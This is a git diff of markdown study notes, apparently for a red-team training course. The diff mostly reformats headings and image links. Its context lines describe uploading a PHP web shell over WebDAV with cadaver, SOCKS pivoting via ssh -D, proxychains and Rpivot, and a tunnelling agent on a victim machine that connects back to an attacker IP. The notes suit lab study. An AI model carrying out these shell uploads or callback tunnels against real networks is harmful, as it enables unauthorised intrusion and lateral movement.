@@ -16,9 +16,8 @@ server.
 cadaver http://10.10.10.1/dav/ - This command is used to enter the /dav directory
 
 put /usr/share/shell.php - PUT method is used to upload the shell.php file.
-```
 
- **Network pivoting**
+<h3>Network Pivoting</h3>
 
 ```bash
 By default 192.168.50.3 is reachable from our machine, but we need to reach another 
@@ -32,7 +31,8 @@ ssh(with -D <proxy port> flag ) connection to the target.
 
 NOTE: USE ANY OF THE PIVOTING TECHNIQUES BELOW IF ONE FAILS TO WORK
 
-**METHOD 1**
+METHOD 1
+
 First: edit proxychains config file and set  the following:
 "socks4 8090, socks5 8090"
 comment dns_leak.
@@ -48,7 +48,7 @@ through Remote desktop protocol(RDP).
 
 #Username and password found in metasploitable.(Optional)
 
-**METHOD 2:** Using Rpivot.
+METHOD 2: Using Rpivot.
 We still need to leave our settings in /proxychains.conf as "socks4 8090, socks5 8090" 
 as we would be making use of socks.
 
@@ -109,15 +109,16 @@ Start the proxy on the attacker server
 
 ```
 
-https://github.com/Fernandez99fc/CRTA/blob/main/Images/Screenshot_(238).png
+![Diagram](https://raw.githubusercontent.com/Fernandez99fc/CRTA/refs/heads/main/Images/Screenshot_(238).png)
+
 
 ```jsx
 Transfer the agent on the victim machine & start the connection
 #Replace this with your attacker IP address.
 ./agent -connect 10.10.200.173:443 -ignore-cert
 ```
+![Diagram](https://raw.githubusercontent.com/Fernandez99fc/CRTA/refs/heads/main/Images/Screenshot_(239).png)
 
-![Screenshot (239).png](Screenshot_(239).png)
 
 ```jsx
 On the server side, we can check that the agent connected successfully.
@@ -130,9 +131,9 @@ Now, fire up a new terminal & check that we can now access the internal IP
 range 192.168.98.0/24
 ```
 
-![Screenshot (241).png](Screenshot_(241).png)
+![Diagram](https://raw.githubusercontent.com/Fernandez99fc/CRTA/refs/heads/main/Images/Screenshot_(241).png)
 
-**Red Teaming**
+<h3>Red Teaming</h3>
 
 ```bash
 Command to scan for open TCP ports on powershell.
